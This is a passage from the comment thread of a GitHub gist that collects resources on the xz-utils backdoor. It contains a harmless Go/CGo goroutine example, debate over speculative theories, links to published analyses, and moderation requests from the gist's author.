[![image](https://private-user-images.githubusercontent.com/5059144/322214784-7d128f46-5747-4faf-9ef1-3c9c732ddb21.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDc4NC03ZDEyOGY0Ni01NzQ3LTRmYWYtOWVmMS0zYzljNzMyZGRiMjEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OTYzZDA1OTZiNWY4MDNmYjFjNDY1Zjc0OTg3MjE1ZDVhOGNmYTRjNGRlMzA3ZjU5MGM3ZDRjZGE5ODRkYzk0NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.24CBjaAtRp38HMBdnUE245a1zPQDWkYQCS3dt-QExPM)](https://private-user-images.githubusercontent.com/5059144/322214784-7d128f46-5747-4faf-9ef1-3c9c732ddb21.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDc4NC03ZDEyOGY0Ni01NzQ3LTRmYWYtOWVmMS0zYzljNzMyZGRiMjEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9OTYzZDA1OTZiNWY4MDNmYjFjNDY1Zjc0OTg3MjE1ZDVhOGNmYTRjNGRlMzA3ZjU5MGM3ZDRjZGE5ODRkYzk0NCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.24CBjaAtRp38HMBdnUE245a1zPQDWkYQCS3dt-QExPM)

Notice how nice and compact the goroutine is! Not many things you can do here but try to intercept the `ret` and `call` instructions, but you will need to also make sure the runtime stack cleanup happens or things will start to go crashycrashy.

So now let's make a C lib call but push it down into a goroutine wrapper, yet make it synchronous. And for fun, the data to the function will be passed via a channel, which brings in the communication/sync areas of the runtime with its maze of runtime functions. And since we're here, let's make it a full Go wrapper, with two channels and a goroutine bridge, and a done signaler.

```
package main

// #include <stdio.h>
// #include <stdlib.h>
// void printFromC(const char* str) {
//     printf("Received C string: %s\n", str);
// }
import "C"
import "unsafe"

func main() {
	myPrint("Hello from Go!")
}

func myPrint(hellostring string) {
	// Protect the C library call from Jia Tan and the NSA
	sendchan := make(chan string)
	recvchan := make(chan string)
	done := make(chan bool)

	go func(sender chan string, receiver chan string){ // This chan is send-only
		go func(receive <-chan string) { // This one is recv-only
			callCPrint(receive)
			done <- true
		}(receiver)
		go func() {
			strToSend := <- sender
			receiver <- strToSend
			close(sender)
			return
		}()
	}(sendchan, recvchan)

	sendchan <- hellostring
	<-done
	return
}

func callCPrint(str <-chan string) {
	cStr := C.CString(<-str)
	defer C.free(unsafe.Pointer(cStr)) // Deallocate memory when done
	C.printFromC(cStr)
}

```

The `main()` in asm representation gets shorter

[![image](https://private-user-images.githubusercontent.com/5059144/322218981-3e0249a4-2999-4635-ad7f-13b0994122d9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxODk4MS0zZTAyNDlhNC0yOTk5LTQ2MzUtYWQ3Zi0xM2IwOTk0MTIyZDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjkwMzM4ZWM2MDlhMWE3OWUyYTg0NjFkNDMwYmM4OWY2ODQ1MTM1MjQ4NDNhYzliMTM2NmQ5YTAzN2RkNGNkMSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.gEjuTovTf26dKliUa8aTuZg4UrECcaFb3ywiBblxc4Q)](https://private-user-images.githubusercontent.com/5059144/322218981-3e0249a4-2999-4635-ad7f-13b0994122d9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxODk4MS0zZTAyNDlhNC0yOTk5LTQ2MzUtYWQ3Zi0xM2IwOTk0MTIyZDkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjkwMzM4ZWM2MDlhMWE3OWUyYTg0NjFkNDMwYmM4OWY2ODQ1MTM1MjQ4NDNhYzliMTM2NmQ5YTAzN2RkNGNkMSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.gEjuTovTf26dKliUa8aTuZg4UrECcaFb3ywiBblxc4Q)

But now there is some real fun going on in `myPrint()` as it's acting as a traffic cop moving the string along its way into the chaos of `pthread`, with its context switches and semaphores. `myPrint` is split by the compiler into 6 asm functions (one each for the launch point and anonymous function of the three goroutines) to allow for their dynamic reallocation to the runtime.

[![image](https://private-user-images.githubusercontent.com/5059144/322219046-7c812676-9ee7-4904-b2bc-76fedff5d7b9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTA0Ni03YzgxMjY3Ni05ZWU3LTQ5MDQtYjJiYy03NmZlZGZmNWQ3YjkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjJjMjFhZGQyNDVlNDE2YTVlMjRkOTAyZThlNGUyYmQ3MzFiMjc2YTlmODI4MjM3NWEzMTk3MDQ3YTIzNTg1ZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.TVDskdNZew7tYd8cLzLuW_5cNfslSRrxnIkN5zHYxvQ)](https://private-user-images.githubusercontent.com/5059144/322219046-7c812676-9ee7-4904-b2bc-76fedff5d7b9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTA0Ni03YzgxMjY3Ni05ZWU3LTQ5MDQtYjJiYy03NmZlZGZmNWQ3YjkucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9YjJjMjFhZGQyNDVlNDE2YTVlMjRkOTAyZThlNGUyYmQ3MzFiMjc2YTlmODI4MjM3NWEzMTk3MDQ3YTIzNTg1ZSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.TVDskdNZew7tYd8cLzLuW_5cNfslSRrxnIkN5zHYxvQ)

That goes on for pages.

`callCPrint` then has a thunk going on, which can't get back its data to `myPrint` without going back through the runtime maze.

[![image](https://private-user-images.githubusercontent.com/5059144/322219294-0d0538ba-7a80-4a3b-9cbb-5b2c1075be9d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTI5NC0wZDA1MzhiYS03YTgwLTRhM2ItOWNiYi01YjJjMTA3NWJlOWQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZWQxOTViMDJlNTBiZmI1NmZlZDMwNmM0YjRiNjI5ZmEwZTYxOTQ1ZWYzZjYwMDM3YTJkNjg1MzU0NDFjNDNiMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.hSbHEcHQuGvLqJztmvXRRtM-6TuGGr3rzjTQszo4nAA)](https://private-user-images.githubusercontent.com/5059144/322219294-0d0538ba-7a80-4a3b-9cbb-5b2c1075be9d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxOTI5NC0wZDA1MzhiYS03YTgwLTRhM2ItOWNiYi01YjJjMTA3NWJlOWQucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZWQxOTViMDJlNTBiZmI1NmZlZDMwNmM0YjRiNjI5ZmEwZTYxOTQ1ZWYzZjYwMDM3YTJkNjg1MzU0NDFjNDNiMiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.hSbHEcHQuGvLqJztmvXRRtM-6TuGGr3rzjTQszo4nAA)

I'm still not sold on this approach but I'm definitely willing to change my own behavior to make these creeps go away if the difficulty is raised high enough. And throwing CGo calls through a goroutine bridge still makes readable code to me.

Sorry, something went wrong.

[![@tdkuehnel](https://avatars.githubusercontent.com/u/3473688?s=80&v=4)](/tdkuehnel)

Copy link

### **[tdkuehnel](/tdkuehnel)** commented [Apr 13, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022496#gistcomment-5022496)

Beside the technical things involved around this incident, which required profound knowledge and ability to develop and implement such an attack, the weak point and what was easy to establish was the social factor of the attack. It took only two persons working together to nudge the project maintainer out of the way. THAT is the real catastrophy.

We need to use the internet to represent our real social connections, not to throw the whole world into one community driven by some huge content aggregators. The real power of the internet is still hidden in its decentralized inherent structure, which we are using and taking benefit of only in small amounts today.

Yes, client-server brought the whole internet thing up to live, but now we are adult enough to decide for our own with whom to share and connect directly and how to decide who has access to which part of my own data. My comments are my data, every content i create is my data, it has to be distributed by the network of the poeple i know and trust, by their devices. Not by content aggregators. When i watch a yt video or other content, i want to see the comments of my friends and social contacts first, access the comments from their data stores directly. Better let me decide and configure which comments to see at all, not let it be dictated by some content aggregators which are deadstuck in their own development. The whole internet has to be shaped around our social contacts and networks, not be dictated by some content aggrgators. /rant off.

Sorry, something went wrong.

[![@cwegener](https://avatars.githubusercontent.com/u/2950544?s=80&v=4)](/cwegener)

Copy link

### **[cwegener](/cwegener)** commented [Apr 14, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022645#gistcomment-5022645) via email

On Sun, 14 Apr 2024 at 06:47, Torsten Kuehnel wrote:
[@tdkuehnel](https://github.com/tdkuehnel) commented on this gist:
It took only two persons working together to nudge the project
maintainer out of the way.
Is this your conclusion or is this statement some new development that
has happened that we have missed? Can you please elaborate.

Sorry, something went wrong.

[![@avbentem](https://avatars.githubusercontent.com/u/1497002?s=80&v=4)](/avbentem)

Copy link

### **[avbentem](/avbentem)** commented [Apr 14, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022865#gistcomment-5022865)

[@cwegener](https://github.com/cwegener) I'm guessing [@tdkuehnel](https://github.com/tdkuehnel) may be referring to what happened in 2022 according to [a list of events](https://boehs.org/node/everything-i-know-about-the-xz-backdoor#2022) curated by [@boehs](https://github.com/boehs).

Sorry, something went wrong.

[![@flybyray](https://avatars.githubusercontent.com/u/804661?s=80&v=4)](/flybyray)

Copy link

### **[flybyray](/flybyray)** commented [Apr 14, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023188#gistcomment-5023188) • edited Loading

> [@flybyray](https://github.com/flybyray) Conspiracy theories and insults from people like you are not helpful.

Perhaps you are in a position to take your sort of interference as an insult.

> A huge amount of people all over the world who are highly competent in this area have been working on dissecting this exploit for 2 weeks, anyone who claims to have found something new on the technical side here in this discussion only demonstrates being clueless.

Are you implying that I am trying to claim something without a proof? And you try it to do only with a mere personal assertion? Pipes!

> Please stop it.

I hope you do that and come back next time with meaningful additions and statements.

I also hope that you understand what an honest discussion is, that you have to fight back when others try to play unfair by ignoring essential context or trying to distort the meaning of statements.

To get back on track:

* I joint this discussion just by pointing out that the ultimate target for a supply chain attack will be the kernel. I was just missing something here.
* that there were surprising changes in the linux-next repo shortly before the backdoor became known. [20/03/2024](https://lwn.net/Articles/966143/)
* [discussions on the kernel mailing regarding this change to remove it](https://lwn.net/ml/linux-kernel/20240329195602.382cb1c99bb70e3d8c6093ae%40linux-foundation.org/), but it was already pushed into linux-next
  + now there is a newer comment [https://lwn.net/ml/linux-kernel/20240404170103.1bc382b3@kaneli/](https://lwn.net/ml/linux-kernel/20240404170103.1bc382b3%40kaneli/) i am happy that my concern is addressed there. but i would be more happy if they would handle all compression tools equally. there should be a strict interface to comply with. i am not sure why only xz should be allowed to run in different form - it just shows that its internal working is to complex.

Exactly what [this recent conclusion section states:](https://securelist.com/xz-backdoor-story-part-1/112354/)

"...

It’s evident that this backdoor is highly complex and employs sophisticated methods to evade detection. These include the multi-stage implantation in the XZ repository, as well as the complex code contained within the binary itself.

There is still much more to explore about the backdoor’s internals, which is why we have decided to present this as Part I of the XZ backdoor series. ..."

"the binary itself" could not be ignored as the master plan ( "golden piece") for a targeted supply chain kernel attack.

[especially the mentioned discussions](#discussions-in-the-wake-of-this) put important things( tangible error ) on the table.

there may be other tools that are part of the build process and are assumed to be safe without question. someone has this concern even tries to scan complete package trees <https://github.com/hlein/distro-backdoor-scanner>

i fear the structure of a suitable defense will look more complex.

hopefully automation and statistics can help to spot risks.

like you need to track maintainers and their commitment to projects. this is just an example:

"""

Many open-source software (OSS) projects are self-organized and do not maintain official lists with information on developer

roles. So, knowing which developers take core and maintainer roles is, despite being relevant, often tacit knowledge. We propose

a method to automatically identify core developers based on role permissions of privileged events triggered in GitHub issues

and pull requests. In an empirical study on 25 GitHub projects, (1) we validate the set of automatically identified core developers

with a sample of project-reported developer lists, and (2) we use our set of identified core developers to assess the accuracy of

state-of-the-art unsupervised developer classification methods. Our results indicate that the set of core developers, which

we extracted from privileged issue events, is sound and the accuracy of state-of-the-art unsupervised classification methods

depends mainly on the data source (commit data vs. issue data) rather than the network-construction method (directed vs.

undirected, etc.). In perspective, our results shall guide research and practice to choose appropriate unsupervised classification

methods, and our method can help create reliable ground-truth data for training supervised classification methods.

"""

ref: [https://www.se.cs.uni-saarland.de/publications/docs/BAJ+23.pdf](https://www.se.cs.uni-saarland.de/publications/docs/BAJ%2B23.pdf)

Sorry, something went wrong.

[![@calestyo](https://avatars.githubusercontent.com/u/919933?s=80&v=4)](/calestyo)

Copy link

### **[calestyo](/calestyo)** commented [Apr 14, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023212#gistcomment-5023212) • edited Loading

I'm not the admin here (so obviously [@thesamesam](https://github.com/thesamesam) decides what this is about and not me), but I had the impression so far that this gist was primarily giving an overview/index/references to the XZ backdoor - not about actual in-depth discussion about the various fields (reverse engineering, OSint, etc. pp) related to it.

That was the nice thing about it, getting only really new/concrete stuff from it.

There do seem to be numerous places which are dedicated to in-depth discussion (and arguing ;-) ) like <https://discord.gg/TPz7gBEE> (for both, reverse engineering and OSint).

Sorry, something went wrong.

[![@AdrianBunk](https://avatars.githubusercontent.com/u/3358267?s=80&v=4)](/AdrianBunk)

Copy link

### **[AdrianBunk](/AdrianBunk)** commented [Apr 14, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023235#gistcomment-5023235)

> I joint this discussion just by pointing out that the ultimate target for a supply chain attack will be the kernel.

That's nonsense.

Nothing you provided indicates that there was actually anything malicious submitted to the kernel, and it would be unbelievably stupid for the attacker to try to add more exploits since this would increase the risk that the openssh backdoor gets detected.

The openssh backdoor would have given the attacker remote administrator access to most Linux servers on the internet.

This is already the ultimate backdoor.

And here is not the right place for people to present whatever thoughts or theories they come up with, please do that in a more appropriate location.

Sorry, something went wrong.

[![@the-lne](https://avatars.githubusercontent.com/u/117259028?s=80&v=4)](/the-lne)

Copy link

### **[the-lne](/the-lne)** commented [Apr 15, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023281#gistcomment-5023281) via email

Wouldn't a forum of computer nerds who actually understand what he did be
the perfect place for theorizing?
…
On Sun, Apr 14, 2024 at 6:21 PM Adrian Bunk \*\*\*@\*\*\*.\*\*\*> wrote:
\*\*\*@\*\*\*.\*\*\*\* commented on this gist.
------------------------------
I joint this discussion just by pointing out that the ultimate target for
a supply chain attack will be the kernel.
That's nonsense.
Nothing you provided indicates that there was actually anything malicious
submitted to the kernel, and it would be unbelievably stupid for the
attacker to try to add more exploits since this would increase the risk
that the openssh backdoor gets detected.
The openssh backdoor would have given the attacker remote administrator
access to most Linux servers on the internet.
This is already the ultimate backdoor.
And here is not the right place for people to present whatever thoughts or
theories they come up with, please do that in a more appropriate location.
—
Reply to this email directly, view it on GitHub
<<https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27#gistcomment-5023235>>
or unsubscribe
<<https://github.com/notifications/unsubscribe-auth/A36TWFCA4PIT7AXM2PFZMUTY5MFQLBFKMF2HI4TJMJ2XIZLTSKBKK5TBNR2WLJDUOJ2WLJDOMFWWLO3UNBZGKYLEL5YGC4TUNFRWS4DBNZ2F6YLDORUXM2LUPGBKK5TBNR2WLJDHNFZXJJDOMFWWLK3UNBZGKYLEL52HS4DFVRZXKYTKMVRXIX3UPFYGLK2HNFZXIQ3PNVWWK3TUUZ2G64DJMNZZDAVEOR4XAZNEM5UXG5FFOZQWY5LFVEYTEOJTGU4DQNBWU52HE2LHM5SXFJTDOJSWC5DF>>
.
You are receiving this email because you commented on the thread.
Triage notifications on the go with GitHub Mobile for iOS
<<https://apps.apple.com/app/apple-store/id1477376905?ct=notification-email&mt=8&pt=524675>>
or Android
<<https://play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dnotification-email%26utm_medium%3Demail%26utm_source%3Dgithub>>
.

Sorry, something went wrong.

[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=80&v=4)](/thesamesam)

Copy link

Author

### **[thesamesam](/thesamesam)** commented [Apr 15, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023292#gistcomment-5023292)

It makes my life a lot easier if the comment section here is kept for editorial changes I need to make, extra sources, etc.

Please keep theorising to other forums. Thanks!

Sorry, something went wrong.

[![@felipec](https://avatars.githubusercontent.com/u/8358?s=80&v=4)](/felipec)

Copy link

### **[felipec](/felipec)** commented [Apr 15, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5024238#gistcomment-5024238)

[@thesamesam](https://github.com/thesamesam) this is a good resource I think: <https://github.com/felipec/xz-min>.

Sorry, something went wrong.

[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=80&v=4)](/thesamesam)

Copy link

Author

### **[thesamesam](/thesamesam)** commented [Apr 16, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5024729#gistcomment-5024729)

Thanks [@felipec](https://github.com/felipec)! I have a few other things to go over in the backlog and can hopefully include them all in a batch later today or tomorrow.

Sorry, something went wrong.

[![@dnorthup-ums](https://avatars.githubusercontent.com/u/18331571?s=80&v=4)](/dnorthup-ums)

Copy link

### **[dnorthup-ums](/dnorthup-ums)** commented [Apr 16, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5025558#gistcomment-5025558)

> [@thesamesam](https://github.com/thesamesam)
>
> Sam, et al:
>
> I think there's another "Easter Egg" in there... Looking again, closely, at Lasse's f9cf4c05 commit (the tukaani repo) and his 02e35059 commit, and then re-reading the build tools scripts, it looks like "Jia" intended to be able to use TCP connections from inside of XZ on platforms built with CMAKE. There's got to be some way to invoke that. Perhaps he hadn't finished implementing that part yet..., but I think that somebody with better fuzzing skills than mine should give it a close look. The good news is that Lasse re-enabled the Landlock function for CMAKE builds...., presuming that "Jia" hadn't hidden something in the Landlock code.

Since there's apparently zero interest, here or elsewhere, about following up on "Jia"'s fairly obvious attempt to weaponize the cmake builds, I'm outta here. I'm not hard to find should anybody not manage to make sense of what I said earlier, but I'm not bothering to follow the conversation here anymore.

Sorry, something went wrong.

[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=80&v=4)](/thesamesam)

Copy link

Author

### **[thesamesam](/thesamesam)** commented [Apr 18, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5027809#gistcomment-5027809)

OK, gone through comments, please let me know if I missed any changes either from here in the last few days or generally on the internet. Thanks!

Sorry, something went wrong.

[![@roccotanica1234](https://avatars.githubusercontent.com/u/166399139?s=80&v=4)](/roccotanica1234)

Copy link

### **[roccotanica1234](/roccotanica1234)** commented [Apr 18, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5028044#gistcomment-5028044)

> Jia Tan's account, associated to jiat0218@gmail.com on Twitter is: <https://twitter.com/JiaT03868010> (I haven't find it mentioned anywhere)

I just noticed that Jia Tan's Twitter registration date (Dec 2020) is earlier than Github registration date. (26 Jan 21)

[![image](https://private-user-images.githubusercontent.com/166399139/323549241-92bc97dd-f341-4e45-91eb-d9a0feb9bf8e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii8xNjYzOTkxMzkvMzIzNTQ5MjQxLTkyYmM5N2RkLWYzNDEtNGU0NS05MWViLWQ5YTBmZWI5YmY4ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMzQwMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lYmZiZDJjZDZkNDUxZmFmMzc2NDc1MDg5YTU2ZmIyMjY2MWQwZDExN2IxN2IwNjJjN2EzMDRmZjFlZjgxYzA0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.L0lHFC6C40PvrPnkG3pHMDli_BtiM8bur5umpkc9YEI)](https://private-user-images.githubusercontent.com/166399139/323549241-92bc97dd-f341-4e45-91eb-d9a0feb9bf8e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii8xNjYzOTkxMzkvMzIzNTQ5MjQxLTkyYmM5N2RkLWYzNDEtNGU0NS05MWViLWQ5YTBmZWI5YmY4ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMzQwMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lYmZiZDJjZDZkNDUxZmFmMzc2NDc1MDg5YTU2ZmIyMjY2MWQwZDExN2IxN2IwNjJjN2EzMDRmZjFlZjgxYzA0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.L0lHFC6C40PvrPnkG3pHMDli_BtiM8bur5umpkc9YEI)

Sorry, something went wrong.

[![@pillowtrucker](https://avatars.githubusercontent.com/u/131599858?s=80&v=4)](/pillowtrucker)

Copy link

### **[pillowtrucker](/pillowtrucker)** commented [Apr 22, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5032521#gistcomment-5032521)

did we gett'em yet

Sorry, something went wrong.

[![@calestyo](https://avatars.githubusercontent.com/u/919933?s=80&v=4)](/calestyo)

Copy link

### **[calestyo](/calestyo)** commented [Apr 24, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5034738#gistcomment-5034738)

[@thesamesam](https://github.com/thesamesam) Kaspersky part 2 on the XZ door is out <https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/>

Sorry, something went wrong.

[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=80&v=4)](/thesamesam)

Copy link

Author

### **[thesamesam](/thesamesam)** commented [Apr 25, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5036325#gistcomment-5036325)

[@calestyo](https://github.com/calestyo) Thanks!

Sorry, something went wrong.

[![@michaelblyons](https://avatars.githubusercontent.com/u/2701605?s=80&v=4)](/michaelblyons)

Copy link

### **[michaelblyons](/michaelblyons)** commented [May 1, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5042901#gistcomment-5042901) • edited Loading

~~You may be interested in [@blasty](https://github.com/blasty)'s [SSH agent](https://GitHub.com/blasty/JiaTansSSHAgent).~~

Oops. I see it on the list now.

Sorry, something went wrong.

[![@varunsh-coder](https://avatars.githubusercontent.com/u/25015917?s=80&v=4)](/varunsh-coder)

Copy link

### **[varunsh-coder](/varunsh-coder)** commented [May 24, 2024](/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5067225#gistcomment-5067225)

[@thesamesam](https://github.com/thesamesam) I want to share my analysis of the XZ Utils build process which was done by monitoring all file write events and process events on the build server. This makes it easier to understand

